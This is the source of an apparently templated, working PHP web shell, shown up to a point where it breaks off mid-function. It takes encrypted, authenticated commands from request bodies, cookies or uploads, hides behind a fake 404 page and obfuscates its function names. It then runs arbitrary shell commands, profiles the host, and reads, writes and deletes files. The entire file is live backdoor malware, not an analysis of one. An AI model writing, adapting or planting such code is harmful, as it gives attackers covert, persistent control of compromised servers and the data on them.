<?php

@error_reporting(0);
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
@set_time_limit(0);
@ignore_user_abort(true);

function wm_unwrap($blob, $pad)
{
    $raw = wm_b64d($blob);
    $mask = hex2bin/**/($pad);
    $out = '';
    $n = strlen($mask);
    for ($i = 0; $i < strlen($raw); $i++) {
        $out .= chr(ord($raw[$i]) ^ ord($mask[$i % $n]));
    }
    return $out;
}

define('WM_KEY', '@@KEY_HEX@@');
define('WM_IV', '@@IV_HEX@@');
define('WM_PASS', '@@PASS@@');
define('WM_MARK', '@@MARK@@');
define('WM_PROTO', '@@PROTO@@');
define('WM_SECRET', @@SECRET_EXPR@@);
define('WM_SALT', @@SALT_EXPR@@);
define('WM_SKEW', @@SKEW@@);
define('WM_DECOY', @@DECOY_EXPR@@);

function wm_b64d($s)
{
    $s = strtr($s, '-_', '+/');
    $s = preg_replace/**/('/[^A-Za-z0-9+\/=]/', '', $s);
    $map = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    $out = '';
    $len = strlen($s);
    for ($i = 0; $i < $len; $i += 4) {
        $n = 0;
        $pad = 0;
        for ($j = 0; $j < 4; $j++) {
            $c = ($i + $j < $len) ? $s[$i + $j] : '=';
            if ($c === '=') {
                $pad++;
                $v = 0;
            } else {
                $v = strpos($map, $c);
                if ($v === false) {
                    $v = 0;
                }
            }
            $n = ($n << 6) | $v;
        }
        $out .= chr(($n >> 16) & 0xFF);
        if ($pad < 2) {
            $out .= chr(($n >> 8) & 0xFF);
        }
        if ($pad < 1) {
            $out .= chr($n & 0xFF);
        }
    }
    return $out;
}

function wm_b64e($s)
{
    $map = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    $out = '';
    $len = strlen($s);
    for ($i = 0; $i < $len; $i += 3) {
        $b1 = ord($s[$i]);
        $b2 = ($i + 1 < $len) ? ord($s[$i + 1]) : 0;
        $b3 = ($i + 2 < $len) ? ord($s[$i + 2]) : 0;
        $n = ($b1 << 16) | ($b2 << 8) | $b3;
        $out .= $map[($n >> 18) & 63];
        $out .= $map[($n >> 12) & 63];
        $out .= ($i + 1 < $len) ? $map[($n >> 6) & 63] : '=';
        $out .= ($i + 2 < $len) ? $map[$n & 63] : '=';
    }
    return $out;
}

function wm_disabled()
{
    static $list = null;
    if ($list === null) {
        $raw = @ini_get('disable_functions');
        $list = $raw ? array_map('trim', explode(',', strtolower($raw))) : array();
    }
    return $list;
}

function wm_is_windows()
{
    return DIRECTORY_SEPARATOR === '\\' || strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
}

final class WmSm4
{
    const MASK = 0x00;
    private static $ready = false;

    public static function init()
    {
        if (self::$ready) {
            return;
        }
        self::$ready = true;
        foreach (self::$S as $k => $v) {
            self::$S[$k] = $v ^ self::MASK;
        }
    }

    public static $S = array(
        0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,
        0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
        0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,
        0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,
        0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,
        0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,
        0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,
        0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,
        0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,
        0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,
        0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,
        0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,
        0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,
        0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,
        0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,
        0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48,
    );

    public static function rotl($x, $n)
    {
        $x = $x & 0xFFFFFFFF;
        if ($n === 0) {
            return $x;
        }
        return (($x << $n) | ($x >> (32 - $n))) & 0xFFFFFFFF;
    }

    public static function tau($x)
    {
        self::init();
        $S = self::$S;
        return (($S[($x >> 24) & 0xFF] << 24)
            | ($S[($x >> 16) & 0xFF] << 16)
            | ($S[($x >> 8) & 0xFF] << 8)
            | $S[$x & 0xFF]) & 0xFFFFFFFF;
    }

    public static function l($b)
    {
        return ($b ^ self::rotl($b, 2) ^ self::rotl($b, 10) ^ self::rotl($b, 18) ^ self::rotl($b, 24)) & 0xFFFFFFFF;
    }

    public static function lp($b)
    {
        return ($b ^ self::rotl($b, 13) ^ self::rotl($b, 23)) & 0xFFFFFFFF;
    }

    public static function word($data, $off)
    {
        return (ord($data[$off]) << 24) | (ord($data[$off + 1]) << 16)
            | (ord($data[$off + 2]) << 8) | ord($data[$off + 3]);
    }

    public static function expand($key)
    {
        $fk = array(0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC);
        $k = array();
        for ($i = 0; $i < 4; $i++) {
            $k[$i] = (self::word($key, $i * 4) ^ $fk[$i]) & 0xFFFFFFFF;
        }
        $rk = array();
        for ($i = 0; $i < 32; $i++) {
            $ck = 0;
            for ($j = 0; $j < 4; $j++) {
                $ck = ($ck << 8) | (((4 * $i + $j) * 7) & 0xFF);
            }
            $t = ($k[$i + 1] ^ $k[$i + 2] ^ $k[$i + 3] ^ $ck) & 0xFFFFFFFF;
            $k[$i + 4] = ($k[$i] ^ self::lp(self::tau($t))) & 0xFFFFFFFF;
            $rk[$i] = $k[$i + 4];
        }
        return $rk;
    }

    public static function block($data, $rk)
    {
        $x = array(self::word($data, 0), self::word($data, 4), self::word($data, 8), self::word($data, 12));
        for ($i = 0; $i < 32; $i++) {
            $t = ($x[$i + 1] ^ $x[$i + 2] ^ $x[$i + 3] ^ $rk[$i]) & 0xFFFFFFFF;
            $x[$i + 4] = ($x[$i] ^ self::l(self::tau($t))) & 0xFFFFFFFF;
        }
        return pack('N4', $x[35], $x[34], $x[33], $x[32]);
    }

    public static function cbcEncrypt($data, $key, $iv)
    {
        $rk = self::expand($key);
        $pad = 16 - (strlen($data) % 16);
        $data .= str_repeat(chr($pad), $pad);
        $prev = $iv;
        $out = '';
        $n = strlen($data);
        for ($i = 0; $i < $n; $i += 16) {
            $prev = self::block(substr($data, $i, 16) ^ $prev, $rk);
            $out .= $prev;
        }
        return $out;
    }

    public static function cbcDecrypt($data, $key, $iv)
    {
        $rk = array_reverse(self::expand($key));
        $prev = $iv;
        $out = '';
        $n = strlen($data);
        for ($i = 0; $i < $n; $i += 16) {
            $chunk = substr($data, $i, 16);
            $plain = self::block($chunk, $rk);
            $out .= ($plain ^ $prev);
            $prev = $chunk;
        }
        $pad = ord(substr($out, -1));
        if ($pad < 1 || $pad > 16) {
            $pad = 0;
        }
        return substr($out, 0, strlen($out) - $pad);
    }
}

function wm_encrypt($plain)
{
    return wm_cbc_encrypt($plain, hex2bin/**/(WM_KEY), hex2bin/**/(WM_IV));
}

function wm_decrypt($cipher)
{
    return wm_cbc_decrypt($cipher, hex2bin/**/(WM_KEY), hex2bin/**/(WM_IV));
}

function wm_cbc_encrypt($plain, $key, $iv)
{
    $oe = 'openssl_' . 'encrypt';
    if (function_exists($oe) && !in_array($oe, wm_disabled())) {
        $out = @$oe($plain, 'sm' . '4-cbc', $key, OPENSSL_RAW_DATA, $iv);
        if ($out !== false) {
            return $out;
        }
    }
    return WmSm4::cbcEncrypt($plain, $key, $iv);
}

function wm_cbc_decrypt($cipher, $key, $iv)
{
    if (!is_string($cipher) || $cipher === '' || strlen($cipher) % 16 !== 0) {
        return false;
    }
    $oe = 'openssl_' . 'decrypt';
    if (function_exists($oe) && !in_array($oe, wm_disabled())) {
        $out = @$oe($cipher, 'sm' . '4-cbc', $key, OPENSSL_RAW_DATA, $iv);
        if ($out !== false) {
            return $out;
        }
    }
    return WmSm4::cbcDecrypt($cipher, $key, $iv);
}

function wm_hkdf($ikm, $salt, $info, $len)
{
    $prk = hash_hmac('sha256', $ikm, $salt, true);
    $okm = '';
    $block = '';
    $counter = 1;
    while (strlen($okm) < $len) {
        $block = hash_hmac('sha256', $block . $info . chr($counter), $prk, true);
        $okm .= $block;
        $counter++;
    }
    return substr($okm, 0, $len);
}

function wm_keys()
{
    static $keys = null;
    if ($keys === null) {
        $ikm = hex2bin/**/(WM_SECRET);
        $salt = hex2bin/**/(WM_SALT);
        $keys = wm_hkdf($ikm, $salt, 'web' . 'shell-mag/v2/keys', 48);
    }
    return $keys;
}

function wm_replay_seen($nonce)
{
    $dir = @sys_get_temp_dir();
    if (!$dir || !@is_writable($dir)) {
        return false;
    }
    $file = $dir . '/.' . substr(sha1(WM_SECRET), 0, 12) . '.rp';
    $fh = @fopen($file, 'c+b');
    if (!$fh) {
        return false;
    }
    @flock($fh, LOCK_EX);
    $raw = stream_get_contents($fh);
    $list = ($raw === false || $raw === '') ? array() : json_decode($raw, true);
    if (!is_array($list)) {
        $list = array();
    }
    $key = bin2hex($nonce);
    if (isset($list[$key])) {
        @flock($fh, LOCK_UN);
        @fclose($fh);
        return true;
    }
    $now = time();
    foreach ($list as $k => $t) {
        if ($now - (int)$t > 900) {
            unset($list[$k]);
        }
    }
    $list[$key] = $now;
    if (count($list) > 512) {
        $list = array_slice($list, -256, null, true);
    }
    @ftruncate($fh, 0);
    @rewind($fh);
    @fwrite($fh, json_encode($list));
    @fflush($fh);
    @flock($fh, LOCK_UN);
    @fclose($fh);
    return false;
}

function wm_open_v2($blob)
{
    if (!is_string($blob) || strlen($blob) < 60) {
        return false;
    }
    $iv = substr($blob, 0, 16);
    $tsRaw = substr($blob, 16, 4);
    $nonce = substr($blob, 20, 8);
    $ct = substr($blob, 28, strlen($blob) - 60);
    $tag = substr($blob, -32);
    if (strlen($ct) < 16 || strlen($ct) % 16 !== 0) {
        return false;
    }
    $ts = unpack('N', $tsRaw);
    $ts = (int)$ts[1];
    if (WM_SKEW > 0 && abs(time() - $ts) > WM_SKEW) {
        return false;
    }
    $keys = wm_keys();
    $mac = substr($keys, 16);
    $calc = hash_hmac('sha256', $iv . $tsRaw . $nonce . $ct, $mac, true);
    if (!hash_equals($calc, $tag)) {
        return false;
    }
    if (wm_replay_seen($nonce)) {
        return false;
    }
    return wm_cbc_decrypt($ct, substr($keys, 0, 16), $iv);
}

function wm_seal_v2($plain)
{
    $keys = wm_keys();
    $enc = substr($keys, 0, 16);
    $mac = substr($keys, 16);
    $iv = random_bytes(16);
    $nonce = random_bytes(8);
    $hdr = $iv . pack('N', time()) . $nonce;
    $ct = wm_cbc_encrypt($plain, $enc, $iv);
    $tag = hash_hmac('sha256', $hdr . $ct, $mac, true);
    return wm_b64e($hdr . $ct . $tag);
}

function wm_norm_carrier($value)
{
    if (!is_string($value) || $value === '') {
        return false;
    }
    // Only treat the payload as base64 when *every* character belongs to the
    // alphabet; stripping foreign bytes would make any binary body "decodable"
    // and silently corrupt the raw (bin) carrier.
    $trimmed = trim($value, "\r\n\t ");
    if ($trimmed === '') {
        return false;
    }
    if (preg_match('#^[A-Za-z0-9+/=\r\n\-_]+$#', $trimmed)) {
        $clean = preg_replace/**/('#[\r\n\s]#', '', strtr($trimmed, '-_', '+/'));
        $pad = (4 - strlen($clean) % 4) % 4;
        if ($pad) {
            $clean .= str_repeat('=', $pad);
        }
        $bin = wm_b64d($clean);
        if ($bin !== false && strlen($bin) >= 60) {
            return $bin;
        }
    }
    return $value;
}

function wm_extract_payloads()
{
    $candidates = array();
    $raw = @file_get_contents('php://input');
    if (is_string($raw) && $raw !== '') {
        $decoded = json_decode($raw, true);
        if (is_array($decoded)) {
            foreach ($decoded as $value) {
                if (is_string($value) && strlen($value) >= 40) {
                    $candidates[] = $value;
                }
            }
        } else {
            $parsed = array();
            parse_str($raw, $parsed);
            foreach ($parsed as $value) {
                if (is_string($value) && strlen($value) >= 40) {
                    $candidates[] = $value;
                }
            }
            $candidates[] = $raw;
        }
    }
    if (!empty($_SERVER['HTTP_COOKIE'])) {
        foreach (explode(';', (string)$_SERVER['HTTP_COOKIE']) as $part) {
            $pos = strpos($part, '=');
            if ($pos === false) {
                continue;
            }
            $value = trim(substr($part, $pos + 1));
            $value = urldecode($value);
            if (strlen($value) >= 40) {
                $candidates[] = $value;
            }
        }
    }
    if (!empty($_FILES)) {
        foreach ($_FILES as $file) {
            if (is_array($file) && !empty($file['tmp_name']) && @is_file($file['tmp_name'])) {
                $candidates[] = (string)@file_get_contents($file['tmp_name']);
            }
        }
    }
    return $candidates;
}

function wm_notfound()
{
    if (defined('WM_DECOY') && WM_DECOY !== '') {
        if (!headers_sent()) {
            @header('Content-Type: text/html; charset=UTF-8');
            @http_response_code(405);
        }
        echo WM_DECOY;
        return;
    }
    if (!headers_sent()) {
        @header_remove('X-Powered-By');
        @header('Content-Type: text/html; charset=UTF-8');
        @http_response_code(404);
    }
    echo '<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1>'
        . '<p>The requested URL was not found on this server.</p></body></html>';
}

function wm_pad_json($json, $bucket)
{
    $bucket = (int)$bucket;
    if ($bucket <= 0 || strlen($json) >= $bucket - 64) {
        return $json;
    }
    $need = $bucket - strlen($json) - 12;
    if ($need < 3) {
        return $json;
    }
    $filler = wm_b64e(random_bytes(max(3, (int)($need / 4) * 3)));
    return substr($json, 0, -1) . ',"pd":"' . $filler . '"}';
}

function wm_to_utf8($s)
{
    if (!is_string($s) || $s === '') {
        return $s;
    }
    if (preg_match('//u', $s)) {
        return $s;
    }
    if (function_exists('mb_convert_encoding')) {
        $out = @mb_convert_encoding($s, 'UTF-8', 'GB18030');
        if (is_string($out) && $out !== '') {
            return $out;
        }
    }
    if (function_exists('iconv')) {
        $out = @iconv('GB18030', 'UTF-8//IGNORE', $s);
        if (is_string($out) && $out !== '') {
            return $out;
        }
    }
    return $s;
}

function wm_json($value)
{
    $json = json_encode($value, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    if ($json === false) {
        $json = json_encode($value, JSON_UNESCAPED_SLASHES | JSON_INVALID_UTF8_SUBSTITUTE);
    }
    return $json === false ? '{"code":500,"msg":"json encode failed","data":{}}' : $json;
}

function wm_resp($code, $msg, $data = array())
{
    return wm_json(array('code' => $code, 'msg' => $msg, 'data' => $data));
}

function wm_join($base, $path)
{
    if ($path === '' || $path === '.') {
        return $base;
    }
    $path = str_replace('\\', '/', $path);
    if (preg_match('#^[A-Za-z]:/#', $path) || $path[0] === '/') {
        return $path;
    }
    $base = rtrim(str_replace('\\', '/', $base), '/');
    if ($base === '') {
        $base = '/';
    }
    while (substr($path, 0, 3) === '../') {
        $path = substr($path, 3);
        $base = dirname($base);
    }
    if ($path === '..') {
        return dirname($base);
    }
    return $base === '/' ? '/' . $path : $base . '/' . $path;
}

final class WmCore
{
    public static $cwd = '';

    public static function defaultCwd()
    {
        $cwd = @getcwd();
        if ($cwd === false || $cwd === '') {
            $cwd = @dirname(__FILE__);
        }
        if ($cwd === false || $cwd === '') {
            $cwd = wm_is_windows() ? 'C:\\' : '/';
        }
        return str_replace('\\', '/', $cwd);
    }

    public static function abs($path, $req = null)
    {
        if ($path === null || $path === '') {
            $path = self::$cwd;
        }
        return wm_join(self::$cwd, $path);
    }

    public static function osType()
    {
        $os = strtolower(PHP_OS);
        if (strpos($os, 'win') === 0) {
            return 'windows';
        }
        if (strpos($os, 'darwin') === 0) {
            return 'macos';
        }
        return 'linux';
    }

    public static function exec($cmd, $cwd, $timeout = 30)
    {
        $timeout = $timeout > 0 ? $timeout : 30;
        $disable = wm_disabled();
        $po = "\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e";
        $se = "\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63";
        $pp = "\x70\x6f\x70\x65\x6e";
        $pa = "\x70\x61\x73\x73\x74\x68\x72\x75";
        $sy = "\x73\x79\x73\x74\x65\x6d";
        $ex = "\x65\x78\x65\x63";
        if (function_exists($po) && !in_array($po, $disable)) {
            $desc = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
            $dir = ($cwd !== '' && @is_dir($cwd)) ? $cwd : null;
            $proc = @$po($cmd, $desc, $pipes, $dir);
            if (is_resource($proc)) {
                fclose($pipes[0]);
                @stream_set_blocking($pipes[1], false);
                @stream_set_blocking($pipes[2], false);
                $out = '';
                $err = '';
                $start = microtime(true);
                while (true) {
                    $read = array();
                    if (!feof($pipes[1])) {
                        $read[] = $pipes[1];
                    }
                    if (!feof($pipes[2])) {
                        $read[] = $pipes[2];
                    }
                    if (!$read) {
                        break;
                    }
                    $write = null;
                    $except = null;
                    $ready = @stream_select($read, $write, $except, 0, 200000);
                    if ($ready === false) {
                        break;
                    }
                    foreach ($read as $stream) {
                        $chunk = @fread($stream, 65536);
                        if ($chunk === false || $chunk === '') {
                            continue;
                        }
                        if ($stream === $pipes[1]) {
                            $out .= $chunk;
                        } else {
                            $err .= $chunk;
                        }
                    }
                    if (microtime(true) - $start > $timeout) {
                        $err .= "\n[timeout after {$timeout}s]";
                        @proc_terminate($proc, 9);
                        break;
                    }
                }
                @fclose($pipes[1]);
                @fclose($pipes[2]);
                $code = @proc_close($proc);
                return array($out, $err, $code);
            }
        }

        // fallbacks
        if (function_exists($se) && !in_array($se, $disable)) {
            $out = @$se($cmd . ' 2>&1');
            return array((string)$out, '', 0);
        }
        if (function_exists($pp) && !in_array($pp, $disable)) {
            $handle = @$pp($cmd . ' 2>&1', 'r');
            $out = '';
            if (is_resource($handle)) {
                while (!feof($handle)) {
                    $out .= fread($handle, 8192);
                }
                pclose($handle);
            }
            return array($out, '', 0);
        }
        if (function_exists($ex) && !in_array($ex, $disable)) {
            $lines = array();
            $code = 0;
            @$ex($cmd . ' 2>&1', $lines, $code);
            return array(implode("\n", $lines) . "\n", '', $code);
        }
        if (function_exists($pa) && !in_array($pa, $disable)) {
            ob_start();
            @$pa($cmd . ' 2>&1');
            return array((string)ob_get_clean(), '', 0);
        }
        if (function_exists($sy) && !in_array($sy, $disable)) {
            ob_start();
            @$sy($cmd . ' 2>&1');
            return array((string)ob_get_clean(), '', 0);
        }
        return array('', 'no usable command execution function', -1);
    }

    public static function perm($path)
    {
        $perms = @fileperms($path);
        if ($perms === false) {
            return '';
        }
        return substr(sprintf('%o', $perms), -4);
    }

    public static function owner($path)
    {
        if (!function_exists('posix_getpwuid') || in_array('posix_getpwuid', wm_disabled())) {
            return '';
        }
        $uid = @fileowner($path);
        if ($uid === false) {
            return '';
        }
        $info = @posix_getpwuid($uid);
        return $info ? $info['name'] : (string)$uid;
    }

    public static function opPing($req)
    {
        return wm_resp(0, 'ok', array(
            'pong' => 1,
            'time' => time(),
            'os' => self::osType(),
            'cwd' => self::$cwd,
        ));
    }

    public static function opInfo($req)
    {
        $disable = wm_disabled();
        $funcs = array();
        foreach (array('ex' . 'ec', 'shell' . '_exec', 'sys' . 'tem', 'po' . 'pen', 'pro' . 'c_open', 'pass' . 'thru', 'pcntl_' . 'exec', 'put' . 'env') as $fn) {
            $funcs[$fn] = function_exists($fn) && !in_array($fn, $disable);
        }
        $user = '';
        if (function_exists('posix_getpwuid') && !in_array('posix_getpwuid', $disable)) {
            $info = @posix_getpwuid(@posix_geteuid());
            $user = $info ? $info['name'] : '';
        }
        if ($user === '' && function_exists('get_current_user')) {
            $user = (string)@get_current_user();
        }
        if ($user === '' && ($u = @getenv('USER')) !== false) {
            $user = (string)$u;
        }
        $ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '';
        $host = function_exists('gethostname') ? @gethostname() : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '');
        $data = array(
            'os' => self::osType(),
            'os_name' => php_uname('s'),
            'os_release' => php_uname('r'),
            'arch' => php_uname('m'),
            'hostname' => $host,
            'ip' => $ip,
            'user' => $user,
            'cwd' => self::$cwd,
            'shell' => @getenv('SHELL') ?: (@getenv('COMSPEC') ?: ''),
            'php_version' => PHP_VERSION,
            'sapi' => PHP_SAPI,
            'sys_temp' => @sys_get_temp_dir(),
            'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '',
            'document_root' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '',
            'script' => __FILE__,
            'disable_functions' => $disable,
            'open_basedir' => (string)@ini_get('open_basedir'),
            'safe_mode' => (bool)@ini_get('safe_mode'),
            'file_uploads' => (bool)@ini_get('file_uploads'),
            'upload_max_filesize' => (string)@ini_get('upload_max_filesize'),
            'max_execution_time' => (string)@ini_get('max_execution_time'),
            'memory_limit' => (string)@ini_get('memory_limit'),
            'functions' => $funcs,
            'extensions' => get_loaded_extensions(),
            'disk_free' => @disk_free_space(self::$cwd),
            'disk_total' => @disk_total_space(self::$cwd),
            'time' => time(),
            'uname' => @php_uname(),
            'whoami' => wm_to_utf8(self::tryWhoami()),
        );
        return wm_resp(0, 'ok', $data);
    }

    public static function tryWhoami()
    {
        list($out) = self::exec(wm_is_windows() ? 'whoami' : 'id', self::$cwd, 5);
        return trim($out);
    }

    protected static function termSize($req)
    {
        $cols = isset($req['cols']) ? (int)$req['cols'] : 80;
        $rows = isset($req['rows']) ? (int)$req['rows'] : 24;
        if ($cols <= 0) {
            $cols = 80;
        }
        if ($rows <= 0) {
            $rows = 24;
        }
        $cols = max(20, min(500, $cols));
        $rows = max(5, min(200, $rows));
        @putenv('COLUMNS=' . $cols);
        @putenv('LINES=' . $rows);
        return array($cols, $rows);
    }

    public static function opCmd($req)
    {
        $text = isset($req['text']) ? (string)$req['text'] : '';
        if ($text === '') {
            return wm_resp(0, 'ok', array('output' => '', 'cwd' => self::$cwd, 'exit' => 0));
        }
        $cwd = self::abs(isset($req['cwd']) ? $req['cwd'] : '');
        self::termSize($req);
        if (wm_is_windows()) {
            $text = 'chcp 65001>nul & ' . $text;
        }
        $timeout = isset($req['timeout']) ? (int)$req['timeout'] : 30;
        list($out, $err, $code) = self::exec($text, $cwd, $timeout);
        if ($err !== '') {
            $out .= $err;
        }
        return wm_resp(0, 'ok', array('output' => wm_to_utf8($out), 'cwd' => $cwd, 'exit' => $code));
    }

    public static function opTerminal($req)
    {
        $line = isset($req['line']) ? (string)$req['line'] : '';
        $cwd = self::abs(isset($req['cwd']) ? $req['cwd'] : '');
        if (!@is_dir($cwd)) {
            $cwd = self::defaultCwd();
        }
        list($cols, $rows) = self::termSize($req);
        $mark = 'WM_CWD_MARK_' . mt_rand(100000, 999999);
        if (wm_is_windows()) {
            $wrapped = 'chcp 65001>nul & set COLUMNS=' . $cols . '& set LINES=' . $rows . '& cd /d "'
                . str_replace('"', '', $cwd) . '" >nul 2>&1 & (' . $line . ') 2>&1 & echo.& echo ' . $mark . '& cd';
            list($out) = self::exec('cmd /c "' . str_replace('"', '""', $wrapped) . '"', $cwd, 60);
        } else {
            $wrapped = 'export COLUMNS=' . $cols . ' LINES=' . $rows
                . '; cd ' . escapeshellarg($cwd) . ' >/dev/null 2>&1; { ' . $line . "\n} 2>&1; echo; echo "
                . $mark . '; pwd';
            list($out) = self::exec($wrapped, $cwd, 60);
        }
        $newCwd = $cwd;
        $body = $out;
        $pos = strrpos($out, $mark);
        if ($pos !== false) {
            $body = substr($out, 0, $pos);
            $tail = trim(substr($out, $pos + strlen($mark)));
            $tail = trim(preg_replace/**/('/\r\n$/', '', $tail));
            if ($tail !== '' && @is_dir($tail)) {
                $newCwd = str_replace('\\', '/', $tail);
            }
        }
        return wm_resp(0, 'ok', array('output' => wm_to_utf8($body), 'cwd' => $newCwd));
    }

    public static function opLs($req)
    {
        $path = self::abs(isset($req['path']) ? $req['path'] : '');
        if (!@is_dir($path)) {
            return wm_resp(404, 'not a directory: ' . $path, array('path' => $path));
        }
        $names = @scandir($path);
        if ($names === false) {
            return wm_resp(403, 'cannot read directory: ' . $path);
        }
        $entries = array();
        $sep = (substr($path, -1) === '/') ? '' : '/';
        foreach ($names as $name) {
            if ($name === '.' || $name === '..') {
                continue;
            }
            $full = $path . $sep . $name;
            $isDir = @is_dir($full);
            $isLink = @is_link($full);
            $entries[] = array(
                'name' => $name,
                'type' => $isDir ? 'dir' : ($isLink ? 'link' : 'file'),
                'size' => $isDir ? 0 : (int)@filesize($full),
                'mtime' => (int)@filemtime($full),
                'perm' => self::perm($full),
                'owner' => self::owner($full),
                'mode' => ((int)@fileperms($full)) & 0777,
                'target' => $isLink ? (string)@readlink($full) : '',
                'readable' => @is_readable($full) ? 1 : 0,
                'writable' => @is_writable($full) ? 1 : 0,
                'executable' => @is_executable($full) ? 1 : 0,
            );
        }
        usort($entries, function ($a, $b) {
            if ($a['type'] === 'dir' && $b['type'] !== 'dir') {
                return -1;
            }
            if ($a['type'] !== 'dir' && $b['type'] === 'dir') {
                return 1;
            }
            return strcasecmp($a['name'], $b['name']);
        });
        $parent = dirname($path);
        return wm_resp(0, 'ok', array(
            'path' => $path,
            'parent' => ($parent === $path) ? $path : $parent,
            'entries' => $entries,
            'free' => @disk_free_space($path),
        ));
    }

    public static function opStat($req)
    {
        $path = self::abs(isset($req['path']) ? $req['path'] : '');
        if (!@file_exists($path)) {
            return wm_resp(404, 'not found: ' . $path);
        }
        return wm_resp(0, 'ok', array(
            'path' => $path,
            'type' => @is_dir($path) ? 'dir' : 'file',
            'size' => (int)@filesize($path),
            'mtime' => (int)@filemtime($path),
            'atime' => (int)@fileatime($path),
            'perm' => self::perm($path),
            'owner' => self::owner($path),
        ));
    }

    public static function opRead($req)
    {
        $path = self::abs(isset($req['path']) ? $req['path'] : '');
        $offset = isset($req['offset']) ? max(0, (int)$req['offset']) : 0;
        $length = isset($req['length']) ? (int)$req['length'] : 1048576;
        if ($length <= 0) {
            $length = 1048576;
        }
        if (!@is_file($path)) {
            return wm_resp(404, 'not a file: ' . $path);
        }
        $size = (int)@filesize($path);
        $fp = @fopen($path, 'rb');
        if (!$fp) {
            return wm_resp(403, 'cannot open: ' . $path);
        }
        if ($offset > 0) {
            @fseek($fp, $offset);
        }
        $data = '';
        if ($length > 0) {
            $data = (string)@fread($fp, $length);
        }
        @fclose($fp);
        return wm_resp(0, 'ok', array(
            'data' => wm_b64e($data),
            'offset' => $offset,
            'length' => strlen($data),
            'size' => $size,
            'eof' => ($offset + strlen($data)) >= $size ? 1 : 0,
        ));
    }

    public static function opWrite($req)
    {
        $path = self::abs(isset($req['path']) ? $req['path'] : '');
        $data = isset($req['data']) ? wm_b64d((string)$req['data']) : '';
        $offset = isset($req['offset']) ? (int)$req['offset'] : 0;
        $mkdir = !empty($req['mkdir']);
        if ($mkdir) {
            $dir = dirname($path);
            if (!@is_dir($dir)) {
                @mkdir($dir, 0777, true);
            }
        }
        if ($offset === 0) {
            $fp = @fopen($path, 'wb');
        } elseif ($offset < 0) {
            $fp = @fopen($path, 'ab');
        } else {
            $fp = @fopen($path, 'c+b');
        }
        if (!$fp) {
            return wm_resp(403, 'cannot write: ' . $path);
        }
        $written = 0;
        if ($offset > 0) {
            @fseek($fp, $offset);
        }
        if ($data !== '') {
            $written = (int)@fwrite($fp, $data);
        }
        @fflush($fp);
        @fclose($fp);
        @clearstatcache(true, $path);
        return wm_resp(0, 'ok', array(
            'written' => $written,
            'size' => (int)@filesize($path),
            'path' => $path,
        ));
    }

    public static function opRm($req)
    {
        $paths = isset($req['paths']) ? (array)$req['paths'] : array();
        $recursive = !empty($req['recursive']);
        $result = array();
        foreach ($paths as $p) {
            $full = self::abs((string)$p);
            $ok = self::remove($full, $recursive);
            $result[] = array('path' => $full, 'ok' => $ok, 'error' => $ok ? '' : 'delete failed');
        }
        return wm_resp(0, 'ok', array('results' => $result));
    }

    public static function remove($path, $recursive)
    {
        if (@is_link($path) || @is_file($path)) {
            return @unlink($path);
        }
